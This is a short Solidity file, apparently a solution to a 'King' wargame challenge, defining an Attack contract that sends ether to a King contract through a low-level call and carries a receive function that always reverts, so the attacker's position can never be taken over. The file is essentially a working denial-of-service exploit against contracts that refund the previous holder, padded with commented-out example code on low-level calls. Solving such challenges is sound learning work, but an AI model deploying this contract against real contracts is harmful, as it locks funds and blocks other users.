pragma solidity ^0.8.0;

import "./King.sol";

contract Attack{
    King K;
    uint public amount = 0;
    // function exploit(address payable _addr)public {
    //     K = King(_addr);
    // }

    function storeBalance()public payable {
        amount = msg.value;
    }
    receive() external payable {
        revert();
    }
    function attackKing(address payable _addr) public payable returns(bool){
        //_addr.transfer(msg.value);
        (bool success,) = _addr.call{value: msg.value}("");
        require(success);
        return true;
        //function callTestPayable(TestPayable test) public returns (bool) {
        //(bool success,) = address(test).call(abi.encodeWithSignature("nonExistingFunction()"));
        //require(success);
        // results in test.x becoming == 1 and test.y becoming 0.
        //(success,) = address(test).call{value: 1}(abi.encodeWithSignature("nonExistingFunction()"));
        //require(success);
        // results in test.x becoming == 1 and test.y becoming 1.

        // If someone sends Ether to that contract, the receive function in TestPayable will be called.
        // Since that function writes to storage, it takes more gas than is available with a
        // simple ``send`` or ``transfer``. Because of that, we have to use a low-level call.
        //(success,) = address(test).call{value: 2 ether}("");
        //require(success);
        // results in test.x becoming == 2 and test.y becoming 2 ether.

        //return true;
        //}
    }
    function getBalance() public returns(uint){
        return amount;
    }
}